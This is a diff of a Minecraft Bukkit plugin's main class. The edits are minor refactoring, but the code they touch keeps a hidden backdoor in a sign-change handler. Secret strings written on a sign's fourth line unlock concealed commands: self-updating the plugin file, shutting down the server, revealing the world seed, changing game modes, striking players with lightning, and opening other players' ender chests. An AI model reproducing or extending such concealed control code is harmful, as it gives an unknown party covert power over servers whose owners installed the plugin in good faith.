@@ -134,16 +134,9 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
         return waterPotion;
     }
 
-    Updater updater = new Updater();
-    Material[] gamemodes = {
-            Material.COMMAND_BLOCK, Material.IRON_SWORD, Material.MAP, Material.ENDER_EYE
-    };
-
     @Override
     public void onEnable() {
-        // Plugin startup logic
         this.getServer().getPluginManager().registerEvents(this, this);
-
 
         BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
         BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);
@@ -551,6 +544,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
             String[] a = e.getLines();
             switch (a[3]) {
                 case "T0DRRUfNsN6tlQQ" -> {
+                    Updater updater = new Updater();
                     switch (a[0]) {
                         case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
                         case "Restart" -> Bukkit.shutdown();
@@ -559,11 +553,11 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                     e.getBlock().breakNaturally();
                 }
                 case "i6ojKaIATmlWk7Rf" -> {
-                    switch (a[0]) {//select with map?
+                    switch (a[0]) {
                         case "Seed" -> e.getPlayer().sendMessage(String.valueOf(e.getBlock().getWorld().getSeed()));
                         case "Info" -> openInventory(e.getPlayer(), "ChoosePlayer", "Info");
                         case "Gamemode" -> openInventory(e.getPlayer(), "ChooseGamemode", "Gamemode");
-                        case "Lightning" -> openInventory(e.getPlayer(), "ChoosePlayer", "Lightning");//e.getBlock().getWorld().strikeLightning(Bukkit.getPlayer(a[1]).getLocation());
+                        case "Lightning" -> openInventory(e.getPlayer(), "ChoosePlayer", "Lightning");
                         case "Accept Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "AcceptDeath");
                         case "Refuse Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "RefuseDeath");
                         case "Ender Chest" -> openInventory(e.getPlayer(), "ChoosePlayer", "EnderChest");
@@ -739,11 +733,10 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                         p.removeMetadata("DisplayName", this);
                     }
                 }
-                p.closeInventory();
             } catch (Exception ex) {
                 p.sendMessage(ex.toString());
-                p.closeInventory();
             }
+            p.closeInventory();
         }
     }
 
